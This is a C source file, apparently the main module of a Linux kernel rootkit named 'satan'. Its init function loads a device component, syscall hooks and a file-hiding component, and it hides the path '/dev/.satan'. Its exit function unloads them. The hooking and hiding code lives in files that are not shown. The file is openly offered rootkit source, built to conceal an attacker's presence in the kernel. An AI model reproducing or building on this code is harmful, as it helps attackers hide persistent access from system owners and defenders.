// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>

#include "dev.h"
#include "file.h"
#include "module.h"
#include "syscall.h"

static int __init satan_init(void)
{
        pr_info("satan: initializing rootkit...\n");

        satan_dev_init(THIS_MODULE);
        satan_syscall_init();
        satan_file_init();

        satan_file_hide("/dev/.satan");

        return 0;
}

static void __exit satan_exit(void)
{
        pr_info("satan: shutting down...\n");


        satan_file_exit();
        satan_syscall_exit();
        satan_dev_exit();
}

module_init(satan_init);
module_exit(satan_exit);

MODULE_LICENSE("GPL v2");
MODULE_VERSION("0.01");
